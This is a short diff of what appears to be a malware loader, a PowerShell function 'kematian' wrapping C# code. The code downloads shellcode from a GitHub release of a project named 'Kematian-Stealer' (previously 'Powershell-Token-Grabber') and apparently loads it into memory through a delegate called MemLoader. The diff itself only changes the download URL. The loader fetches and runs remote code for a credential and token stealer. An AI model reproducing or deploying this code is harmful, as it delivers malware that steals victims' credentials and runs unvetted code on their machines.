@@ -11,7 +11,7 @@ function kematian {
         delegate void MemLoader();
 
         public static void Main() {
-            string url = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/shellcode.bin";
+            string url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/download/AutoBuild/shellcode.bin";
             byte[] golangshc;
             using (WebClient client = new WebClient()) {
                 golangshc = client.DownloadData(url);
